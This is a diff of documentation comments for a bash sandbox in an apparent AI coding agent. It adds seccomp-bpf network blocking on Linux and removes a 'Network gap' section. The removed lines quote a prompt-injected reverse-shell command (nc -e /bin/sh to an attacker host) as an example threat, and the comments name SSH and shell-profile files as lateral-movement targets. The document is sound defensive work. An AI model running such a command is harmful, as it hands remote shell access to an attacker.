@@ -10,22 +10,24 @@
 //!   write-allowed as literals so normal shell scripts function.
 //! * Lateral movement: ~/.ssh/authorized_keys, ~/.bashrc etc. denied by
 //!   the write scope.
-//! * Network tunneling: outbound network denied except loopback on macOS.
-//!   Not enforced on Linux until landlock >= 6.7 or a seccomp companion
-//!   lands; see "Network gap" below.
+//! * Network tunneling: outbound network denied except loopback on macOS;
+//!   outbound AF_INET/AF_INET6 socket creation denied entirely on Linux
+//!   via seccomp-bpf (closed in Phase C). Loopback TCP/UDP is also denied
+//!   on Linux as a side effect of socket-family filtering; AF_UNIX local
+//!   sockets (docker.sock, psql.sock) remain allowed. Linux users who
+//!   need outbound network or loopback can opt out with
+//!   zag.set_bash_sandbox_level("permissive").
 //!
 //! Platform support:
 //! * macOS: sandbox-exec with a generated seatbelt profile (see
 //!   buildSeatbeltProfile).
-//! * Linux: kernel Landlock LSM, filesystem-only. Installed by a
-//!   self-re-exec helper (see sandbox/helper_linux.zig). Kernels < 5.13
-//!   or with Landlock disabled at boot fall back to unsandboxed with
-//!   a logged warning. Network coverage is the documented gap.
+//! * Linux: kernel Landlock LSM for filesystem isolation plus seccomp-bpf
+//!   socket-family filter for network isolation. Installed by a
+//!   self-re-exec helper (see sandbox/helper_linux.zig). Either failing
+//!   (kernel < 5.13 for Landlock; kernel < 3.5 or seccomp disabled) falls
+//!   back to the other plus a logged warning; both failing falls back to
+//!   unsandboxed.
 //! * Other platforms: unsandboxed with a logged warning.
-//!
-//! Network gap (Linux): a prompt-injected `nc -e /bin/sh attacker:4444`
-//! is not blocked by Landlock 5.13. Future Phase C will close this via
-//! either seccomp-bpf connect() filtering or Landlock 6.7 net rules.
 //!
 //! Opt-out:
 //! * zag.set_bash_sandbox_level("permissive") in config.lua disables the
